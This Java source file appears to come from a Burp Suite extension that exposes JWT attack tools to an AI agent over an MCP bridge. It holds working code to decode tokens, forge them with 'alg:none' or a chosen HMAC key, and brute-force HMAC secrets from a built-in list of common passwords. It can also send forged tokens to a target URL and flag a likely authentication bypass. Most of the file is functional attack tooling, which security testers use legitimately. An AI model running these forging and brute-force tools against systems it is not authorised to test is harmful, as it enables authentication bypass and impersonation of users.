package com.burpmcpbridge.tools;

import burp.api.montoya.MontoyaApi;
import com.burpmcpbridge.mcp.ToolRegistry;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

public class JwtTools extends BaseTool {

    public JwtTools(MontoyaApi api, ToolRegistry registry) {
        super(api, registry);
    }

    @Override
    public void register() {
        registry.register("jwt_decode",
            "Decode a JWT token, showing header and payload claims without verification",
            buildObjectSchema(
                stringProp("token", "JWT token to decode", true),
                boolProp("show_claims", "Show parsed claims in detail (default: true)", false)
            ),
            this::jwtDecode
        );

        registry.register("jwt_forge",
            "Forge a JWT token with custom claims. Supports alg:none bypass, HMAC key brute-force, and custom payloads.",
            buildObjectSchema(
                stringProp("header_alg", "Algorithm to use: none, HS256, HS384, HS512, RS256 (default: none)", false),
                stringProp("secret_key", "HMAC secret key for HS256/HS384/HS512 (optional)", false),
                stringProp("payload_json", "Custom payload as JSON string (optional, overrides individual claims)", false),
                stringProp("issuer", "iss claim value (optional)", false),
                stringProp("subject", "sub claim value (optional)", false),
                stringProp("audience", "aud claim value (optional)", false),
                stringProp("expire_seconds", "Token expiry in seconds from now (default: 3600)", false),
                stringProp("custom_claim_name", "Name of a custom claim to add (optional)", false),
                stringProp("custom_claim_value", "Value of the custom claim (optional)", false),
                boolProp("send_in_request", "Send forged token in Authorization header to a URL (default: false)", false),
                stringProp("target_url", "URL to send the forged token to (required if send_in_request=true)", false)
            ),
            this::jwtForge
        );

        registry.register("jwt_bruteforce",
            "Attempt to brute-force JWT HMAC secret key using a wordlist of common secrets",
            buildObjectSchema(
                stringProp("token", "JWT token to brute-force", true),
                intProp("max_attempts", "Maximum number of attempts (default: 100)", false)
            ),
            this::jwtBruteforce
        );
    }

    private JsonObject jwtDecode(JsonObject args) {
        String token = args.has("token") ? args.get("token").getAsString() : "";
        boolean showClaims = !args.has("show_claims") || args.get("show_claims").getAsBoolean();

        if (token.isEmpty()) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "token is required");
            return error;
        }

        String[] parts = token.split("\\.");
        if (parts.length < 2) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "Invalid JWT format: expected at least 2 parts separated by dots");
            return error;
        }

        JsonObject result = new JsonObject();
        result.addProperty("token_length", token.length());
        result.addProperty("parts_count", parts.length);

        try {
            String headerJson = decodeBase64Url(parts[0]);
            result.addProperty("header_raw", headerJson);

            try {
                JsonObject headerObj = com.google.gson.JsonParser.parseString(headerJson).getAsJsonObject();
                result.add("header", headerObj);
                if (headerObj.has("alg")) {
                    result.addProperty("algorithm", headerObj.get("alg").getAsString());
                }
                if (headerObj.has("typ")) {
                    result.addProperty("type", headerObj.get("typ").getAsString());
                }
                if (headerObj.has("kid")) {
                    result.addProperty("key_id", headerObj.get("kid").getAsString());
                }
            } catch (Exception e) {
                result.addProperty("header_parse_error", "Could not parse header as JSON: " + e.getMessage());
            }
        } catch (Exception e) {
            result.addProperty("header_decode_error", "Could not decode header: " + e.getMessage());
        }

        try {
            String payloadJson = decodeBase64Url(parts[1]);
            result.addProperty("payload_raw", payloadJson);

            try {
                JsonObject payloadObj = com.google.gson.JsonParser.parseString(payloadJson).getAsJsonObject();
                result.add("payload", payloadObj);

                if (showClaims) {
                    JsonObject claims = new JsonObject();
                    if (payloadObj.has("iss")) claims.addProperty("issuer", payloadObj.get("iss").getAsString());
                    if (payloadObj.has("sub")) claims.addProperty("subject", payloadObj.get("sub").getAsString());
                    if (payloadObj.has("aud")) claims.addProperty("audience", payloadObj.get("aud").getAsString());
                    if (payloadObj.has("exp")) {
                        long exp = payloadObj.get("exp").getAsLong();
                        claims.addProperty("expires_at", new java.util.Date(exp * 1000).toString());
                        boolean expired = System.currentTimeMillis() / 1000 > exp;
                        claims.addProperty("is_expired", expired);
                    }
                    if (payloadObj.has("iat")) {
                        long iat = payloadObj.get("iat").getAsLong();
                        claims.addProperty("issued_at", new java.util.Date(iat * 1000).toString());
                    }
                    if (payloadObj.has("nbf")) {
                        long nbf = payloadObj.get("nbf").getAsLong();
                        claims.addProperty("not_before", new java.util.Date(nbf * 1000).toString());
                    }
                    if (payloadObj.has("jti")) claims.addProperty("jwt_id", payloadObj.get("jti").getAsString());
                    result.add("claims_summary", claims);
                }
            } catch (Exception e) {
                result.addProperty("payload_parse_error", "Could not parse payload as JSON: " + e.getMessage());
            }
        } catch (Exception e) {
            result.addProperty("payload_decode_error", "Could not decode payload: " + e.getMessage());
        }

        if (parts.length >= 3) {
            result.addProperty("signature_present", true);
            result.addProperty("signature_length", parts[2].length());
        } else {
            result.addProperty("signature_present", false);
            result.addProperty("warning", "No signature - this is an unsecured JWT (alg:none)");
        }

        return result;
    }

    private JsonObject jwtForge(JsonObject args) {
        String alg = args.has("header_alg") ? args.get("header_alg").getAsString() : "none";
        String secretKey = args.has("secret_key") ? args.get("secret_key").getAsString() : null;
        String payloadJson = args.has("payload_json") ? args.get("payload_json").getAsString() : null;
        String issuer = args.has("issuer") ? args.get("issuer").getAsString() : null;
        String subject = args.has("subject") ? args.get("subject").getAsString() : null;
        String audience = args.has("audience") ? args.get("audience").getAsString() : null;
        int expireSeconds = args.has("expire_seconds") ? args.get("expire_seconds").getAsInt() : 3600;
        String customClaimName = args.has("custom_claim_name") ? args.get("custom_claim_name").getAsString() : null;
        String customClaimValue = args.has("custom_claim_value") ? args.get("custom_claim_value").getAsString() : null;
        boolean sendInRequest = args.has("send_in_request") && args.get("send_in_request").getAsBoolean();
        String targetUrl = args.has("target_url") ? args.get("target_url").getAsString() : null;

        JsonObject header = new JsonObject();
        header.addProperty("alg", alg);
        header.addProperty("typ", "JWT");

        JsonObject payload;
        if (payloadJson != null && !payloadJson.isEmpty()) {
            try {
                payload = com.google.gson.JsonParser.parseString(payloadJson).getAsJsonObject();
            } catch (Exception e) {
                JsonObject error = new JsonObject();
                error.addProperty("error", "Invalid payload_json: " + e.getMessage());
                return error;
            }
        } else {
            payload = new JsonObject();
        }

        long now = System.currentTimeMillis() / 1000;
        if (!payload.has("iat")) payload.addProperty("iat", now);
        if (!payload.has("exp")) payload.addProperty("exp", now + expireSeconds);
        if (issuer != null) payload.addProperty("iss", issuer);
        if (subject != null) payload.addProperty("sub", subject);
        if (audience != null) payload.addProperty("aud", audience);
        if (customClaimName != null && customClaimValue != null) {
            try {
                payload.addProperty(customClaimName, Integer.parseInt(customClaimValue));
            } catch (NumberFormatException e) {
                payload.addProperty(customClaimName, customClaimValue);
            }
        }

        String headerB64 = encodeBase64Url(header.toString());
        String payloadB64 = encodeBase64Url(payload.toString());
        String signingInput = headerB64 + "." + payloadB64;

        String signature;
        if (alg.equals("none")) {
            signature = "";
        } else if (alg.startsWith("HS")) {
            if (secretKey == null || secretKey.isEmpty()) {
                JsonObject error = new JsonObject();
                error.addProperty("error", "secret_key is required for HMAC algorithms");
                return error;
            }
            signature = hmacSign(signingInput, secretKey, alg);
        } else {
            JsonObject error = new JsonObject();
            error.addProperty("error", "Algorithm " + alg + " not supported for forging. Use: none, HS256, HS384, HS512");
            return error;
        }

        String forgedToken = signingInput + (signature.isEmpty() ? "." : "." + signature);

        JsonObject result = new JsonObject();
        result.addProperty("forged_token", forgedToken);
        result.addProperty("algorithm", alg);
        result.add("header", header);
        result.add("payload", payload);

        if (alg.equals("none")) {
            result.addProperty("attack_type", "alg:none bypass");
            result.addProperty("warning", "alg:none attack removes signature verification. Many servers reject these tokens.");
        } else {
            result.addProperty("attack_type", "HMAC key forge");
            result.addProperty("secret_key_used", secretKey);
        }

        if (sendInRequest && targetUrl != null) {
            try {
                var request = burp.api.montoya.http.message.requests.HttpRequest.httpRequestFromUrl(targetUrl)
                    .withAddedHeader("Authorization", "Bearer " + forgedToken);
                var response = api.http().sendRequest(request);
                result.addProperty("response_status", response.response().statusCode());
                result.addProperty("response_length", response.response().body().length());

                String respBody = response.response().bodyToString();
                boolean authBypass = response.response().statusCode() == 200
                    && !respBody.contains("unauthorized") && !respBody.contains("invalid token")
                    && !respBody.contains("access denied");
                result.addProperty("potential_bypass", authBypass);
            } catch (Exception e) {
                result.addProperty("request_error", e.getMessage());
            }
        }

        return result;
    }

    private JsonObject jwtBruteforce(JsonObject args) {
        String token = args.has("token") ? args.get("token").getAsString() : "";
        int maxAttempts = args.has("max_attempts") ? args.get("max_attempts").getAsInt() : 100;

        if (token.isEmpty()) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "token is required");
            return error;
        }

        String[] parts = token.split("\\.");
        if (parts.length < 3) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "JWT must have 3 parts for signature verification");
            return error;
        }

        String headerAlg;
        try {
            String headerJson = decodeBase64Url(parts[0]);
            JsonObject header = com.google.gson.JsonParser.parseString(headerJson).getAsJsonObject();
            headerAlg = header.has("alg") ? header.get("alg").getAsString() : "HS256";
        } catch (Exception e) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "Could not decode JWT header: " + e.getMessage());
            return error;
        }

        if (!headerAlg.startsWith("HS")) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "Brute-force only works with HMAC algorithms (HS256/HS384/HS512). Found: " + headerAlg);
            return error;
        }

        String signingInput = parts[0] + "." + parts[1];
        String targetSignature = parts[2];

        String[] commonSecrets = {
            "secret", "password", "123456", "jwt_secret", "key", "token",
            "admin", "test", "default", "12345678", "qwerty", "abc123",
            "letmein", "monkey", "master", "dragon", "login", "passw0rd",
            "hello", "whatever", "changeme", "1234567890", "0987654321",
            "my_secret", "super_secret", "jwt-secret", "jwt_secret_key",
            "your-256-bit-secret", "secret_key", "private_key", "app_secret",
            "HS256", "HS384", "HS512", "none", "null", "undefined",
            "s3cr3t", "p@ssw0rd", "P@ssw0rd", "admin123", "root",
            "toor", "pass", "pass123", "123456789", "1234567890123456",
            "0123456789ABCDEF", "ABCDEFGHJKLMNPQRSTUVWXYZ", "key1", "key2",
            "signing-key", "signing_key", "signingkey", "sign-key",
            "mysecretkey", "my-secret-key", "my_secret_key",
            "application-secret", "application_secret",
            "jwt-signing-key", "jwt_signing_key",
            "thisisasecretkey", "this-is-a-secret-key",
            "please-change-this", "change-this-secret",
            "keyboard cat", "shhh", "ssh", "quiet"
        };

        int limit = Math.min(maxAttempts, commonSecrets.length);
        String foundKey = null;

        for (int i = 0; i < limit; i++) {
            String candidate = commonSecrets[i];
            String computedSig = hmacSign(signingInput, candidate, headerAlg);
            if (computedSig.equals(targetSignature)) {
                foundKey = candidate;
                break;
            }
        }

        JsonObject result = new JsonObject();
        result.addProperty("algorithm", headerAlg);
        result.addProperty("attempts_made", limit);
        result.addProperty("wordlist_size", commonSecrets.length);

        if (foundKey != null) {
            result.addProperty("key_found", true);
            result.addProperty("secret_key", foundKey);
            result.addProperty("severity", "CRITICAL");
            result.addProperty("note", "JWT secret key discovered! This allows token forgery for any user.");

            String forgedToken = signingInput + "." + hmacSign(signingInput, foundKey, headerAlg);
            result.addProperty("verified_forged_token", forgedToken);
        } else {
            result.addProperty("key_found", false);
            result.addProperty("note", "Key not found in common wordlist. Try with a larger wordlist or custom secrets.");
        }

        return result;
    }

    private String decodeBase64Url(String input) {
        String padded = input.replace("-", "+").replace("_", "/");
        while (padded.length() % 4 != 0) {
            padded += "=";
        }
        byte[] decoded = Base64.getDecoder().decode(padded);
        return new String(decoded, StandardCharsets.UTF_8);
    }

    private String encodeBase64Url(String input) {
        return Base64.getUrlEncoder().withoutPadding()
            .encodeToString(input.getBytes(StandardCharsets.UTF_8));
    }

    private String hmacSign(String data, String key, String algorithm) {
        try {
            String hmacAlg;
            switch (algorithm) {
                case "HS384": hmacAlg = "HmacSHA384"; break;
                case "HS512": hmacAlg = "HmacSHA512"; break;
                default: hmacAlg = "HmacSHA256"; break;
            }
            javax.crypto.spec.SecretKeySpec keySpec = new javax.crypto.spec.SecretKeySpec(
                key.getBytes(StandardCharsets.UTF_8), hmacAlg);
            javax.crypto.Mac mac = javax.crypto.Mac.getInstance(hmacAlg);
            mac.init(keySpec);
            byte[] signature = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
            return Base64.getUrlEncoder().withoutPadding().encodeToString(signature);
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
}